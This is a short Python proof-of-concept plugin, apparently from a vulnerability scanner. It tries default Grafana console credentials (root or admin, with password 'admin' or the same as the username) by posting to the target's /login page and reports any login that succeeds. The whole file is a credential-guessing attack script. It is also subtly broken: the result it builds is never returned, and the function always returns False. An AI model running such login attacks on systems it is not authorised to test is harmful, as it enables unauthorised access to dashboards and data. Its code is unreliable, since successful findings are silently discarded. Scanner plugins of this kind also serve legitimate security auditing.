# Author:w8ay
# Name:grafana 控制台弱口令

import HackRequests
from urllib.parse import urlparse


def poc(arg, **kwargs):
    user_list = ["root", "admin"]
    pass_list = ["admin", "{user}"]
    hack = HackRequests.hackRequests()
    for user in user_list:
        for p in pass_list:
            p = p.replace("{user}", user)
            login_data = "{\"user\":\"%s\",\"email\":\"\",\"password\":\"%s\"}" % (
                user, p)
            hh = hack.http(arg + "/login", post=login_data)
            if "Logged in" in hh.text():
                result = {
                    "name": "grafana 控制台弱口令",  # 插件名称
                    # 插件返回内容详情，会造成什么后果。
                    "content": "user:{} password:{}".format(user, p),
                    "url": arg + "/login",  # 漏洞存在url
                    "log": hh.log,
                    "tag": "info_leak"  # 漏洞标签
                }
    return False
